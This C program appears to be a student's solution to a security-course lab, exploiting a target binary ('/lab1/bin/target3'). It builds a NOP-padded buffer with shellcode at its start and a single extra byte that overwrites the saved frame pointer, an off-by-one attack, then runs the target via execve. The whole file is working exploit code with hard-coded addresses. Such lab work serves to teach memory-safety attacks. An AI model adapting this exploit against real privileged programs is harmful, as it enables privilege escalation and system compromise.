#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/lab1/bin/target3"

#define NOOP 0x90                 // no-op instruction
#define BUFLEN 336                // target buffer length
#define OVERWRITING_BYTE_LEN 1    // the extra byte we are overwritting to change FP

// current eip = 0x080483d6
// ret instruction found at 0x8048351

#define OVERWRITING_BYTE 0x51 // the extra byte we are overwritting to change FP

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[BUFLEN + OVERWRITING_BYTE_LEN];

  memset(buf, NOOP, sizeof(buf) - 1);

  // copy the shell code to be at the beginning of the buffer
  memcpy(buf, shellcode, sizeof(shellcode) - 1);

  // set the last byte in the buffer to be the overwritting byte
  buf[BUFLEN] = OVERWRITING_BYTE;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
